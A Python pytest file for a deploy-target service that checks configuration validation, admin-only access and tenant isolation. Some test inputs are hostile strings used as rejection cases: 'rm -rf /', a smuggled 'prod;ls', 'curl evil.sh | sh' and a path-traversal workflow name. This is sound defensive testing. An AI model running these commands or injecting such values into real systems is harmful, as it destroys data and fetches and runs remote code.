"""How a repository is deployed: the shape of the configuration, its storage, and the admin API around it."""

from typing import Any
from uuid import uuid4

import pytest
from pydantic import ValidationError

from app.deploy.target import DeployTargetConfig, EnvironmentRule
from tests.jwt_helpers import TENANT_B
from tests.test_github_app_api import (
    Env,
    FakeAppClient,
    _connect_repository,
)
from tests.test_github_app_api import (
    env as app_env,
)

env = app_env  # the fixture of the GitHub API tests, reused here
BASE = "/api/v1/deploy-targets"


def _config(**overrides: Any) -> dict[str, Any]:
    return {
        "workflowFile": "deploy.yml",
        "environments": [
            {"name": "staging", "enabled": True, "approver": "ENGINEER"},
            {"name": "production", "enabled": True, "requiresPreviousVerified": True},
        ],
    } | overrides


# ------------------------------------------------------------------ the shape


def test_a_small_configuration_gets_safe_defaults() -> None:
    config = DeployTargetConfig.model_validate({"workflowFile": "deploy.yml", "environments": [{"name": "production"}]})

    rule = config.environments[0]
    assert rule.enabled is False  # nothing deploys until an admin turns the environment on
    assert rule.approver == "ADMIN"
    assert rule.auto_rollback is False
    assert rule.soak_seconds == 900
    assert 0 < rule.thresholds.improvement_margin < 1


@pytest.mark.parametrize("workflow", ["../deploy.yml", "deploy", "deploy.sh", "dir/deploy.yml", "my deploy.yml", "deploy.yml; rm -rf /", "", ".yml"])
def test_a_workflow_must_be_a_plain_file_name(workflow: str) -> None:
    with pytest.raises(ValidationError):
        DeployTargetConfig.model_validate(_config(workflowFile=workflow))


@pytest.mark.parametrize("workflow", ["deploy.yml", "Deploy-Prod.yaml", "release_2.yml"])
def test_ordinary_workflow_names_are_accepted(workflow: str) -> None:
    assert DeployTargetConfig.model_validate(_config(workflowFile=workflow)).workflow_file == workflow


@pytest.mark.parametrize("name", ["Production", "prod uction", "prod;ls", "-staging", "", "a" * 64, "staging\n", "stagé"])
def test_an_environment_name_is_a_short_lowercase_token(name: str) -> None:
    with pytest.raises(ValidationError):
        EnvironmentRule.model_validate({"name": name})


def test_a_production_looking_environment_can_only_be_approved_by_an_admin() -> None:
    with pytest.raises(ValidationError, match="ADMIN"):
        EnvironmentRule.model_validate({"name": "production", "approver": "ENGINEER"})
    with pytest.raises(ValidationError, match="ADMIN"):
        EnvironmentRule.model_validate({"name": "eu-prod", "approver": "ENGINEER"})
    assert EnvironmentRule.model_validate({"name": "staging", "approver": "ENGINEER"}).approver == "ENGINEER"


def test_environments_need_unique_names_a_sensible_order_and_a_sensible_count() -> None:
    twice = [{"name": "staging"}, {"name": "staging"}]
    with pytest.raises(ValidationError, match="unique"):
        DeployTargetConfig.model_validate(_config(environments=twice))
    with pytest.raises(ValidationError, match="no previous"):
        DeployTargetConfig.model_validate(_config(environments=[{"name": "staging", "requiresPreviousVerified": True}]))
    with pytest.raises(ValidationError):
        DeployTargetConfig.model_validate(_config(environments=[]))
    with pytest.raises(ValidationError):
        DeployTargetConfig.model_validate(_config(environments=[{"name": f"env-{i}"} for i in range(6)]))


def test_the_soak_must_outlast_the_grace_period() -> None:
    with pytest.raises(ValidationError, match="soak"):
        EnvironmentRule.model_validate({"name": "staging", "soakSeconds": 120})  # the default grace is 120 seconds: nothing left to judge
    with pytest.raises(ValidationError, match="soak"):
        EnvironmentRule.model_validate({"name": "staging", "soakSeconds": 900, "thresholds": {"graceSeconds": 900}})
    assert EnvironmentRule.model_validate({"name": "staging", "soakSeconds": 180}).soak_seconds == 180


@pytest.mark.parametrize(
    "field",
    [{"soakSeconds": 5}, {"soakSeconds": 100_000}, {"deployTimeoutSeconds": 0}, {"thresholds": {"improvementMargin": 1}}, {"thresholds": {"improvementMargin": 0}}, {"thresholds": {"minTraffic": 0}}],
)
def test_numbers_have_ranges(field: dict[str, Any]) -> None:
    with pytest.raises(ValidationError):
        EnvironmentRule.model_validate({"name": "staging"} | field)


def test_unknown_fields_are_refused_so_a_command_cannot_be_smuggled_in() -> None:
    with pytest.raises(ValidationError):
        DeployTargetConfig.model_validate(_config(command="curl evil.sh | sh"))
    with pytest.raises(ValidationError):
        EnvironmentRule.model_validate({"name": "staging", "script": "rm -rf /"})


def test_the_promotion_order_is_the_order_of_the_list() -> None:
    config = DeployTargetConfig.model_validate(_config())

    assert config.previous_of("production") is config.environments[0]
    assert config.previous_of("staging") is None
    assert config.previous_of("unknown") is None
    assert config.rule_for("production") is config.environments[1]
    assert config.rule_for("unknown") is None


# ------------------------------------------------------------------ the API


def test_everything_needs_an_admin(env: tuple[Env, FakeAppClient]) -> None:
    e, _ = env
    url = f"{BASE}/{uuid4()}"
    assert e.client.get(url).status_code == 401
    for role in ("ENGINEER", "VIEWER"):
        headers = e.headers(role=role)
        assert e.client.get(url, headers=headers).status_code == 403
        assert e.client.put(url, json=_config(), headers=headers).status_code == 403
        assert e.client.delete(url, headers=headers).status_code == 403


def test_a_target_is_saved_read_replaced_and_deleted(env: tuple[Env, FakeAppClient]) -> None:
    e, _ = env
    repository = _connect_repository(e)
    url = f"{BASE}/{repository}"
    assert e.client.get(url, headers=e.headers()).status_code == 404

    saved = e.client.put(url, json=_config(), headers=e.headers())
    assert saved.status_code == 200, saved.text
    body = saved.json()
    assert body["repositoryId"] == repository
    assert [x["name"] for x in body["config"]["environments"]] == ["staging", "production"]
    assert body["config"]["environments"][1]["requiresPreviousVerified"] is True

    assert e.client.get(url, headers=e.headers()).json()["config"] == body["config"]

    replaced = e.client.put(url, json=_config(workflowFile="release.yml", environments=[{"name": "production"}]), headers=e.headers())
    assert replaced.json()["config"]["workflowFile"] == "release.yml"
    assert len(e.client.get(url, headers=e.headers()).json()["config"]["environments"]) == 1

    assert e.client.delete(url, headers=e.headers()).status_code == 204
    assert e.client.get(url, headers=e.headers()).status_code == 404
    assert e.client.delete(url, headers=e.headers()).status_code == 404


def test_an_invalid_configuration_is_refused_and_nothing_is_stored(env: tuple[Env, FakeAppClient]) -> None:
    e, _ = env
    repository = _connect_repository(e)
    url = f"{BASE}/{repository}"

    refused = e.client.put(url, json=_config(workflowFile="../../evil.yml"), headers=e.headers())

    assert refused.status_code == 422
    assert e.client.get(url, headers=e.headers()).status_code == 404


def test_another_tenants_repository_cannot_be_given_a_target(env: tuple[Env, FakeAppClient]) -> None:
    e, _ = env
    repository = _connect_repository(e)
    url = f"{BASE}/{repository}"
    e.client.put(url, json=_config(), headers=e.headers())

    assert e.client.get(url, headers=e.headers(tenant=TENANT_B)).status_code == 404
    assert e.client.put(url, json=_config(), headers=e.headers(tenant=TENANT_B)).status_code == 404
    assert e.client.delete(url, headers=e.headers(tenant=TENANT_B)).status_code == 404
    assert e.client.get(url, headers=e.headers()).status_code == 200  # untouched
    assert e.client.put(f"{BASE}/{uuid4()}", json=_config(), headers=e.headers()).status_code == 404
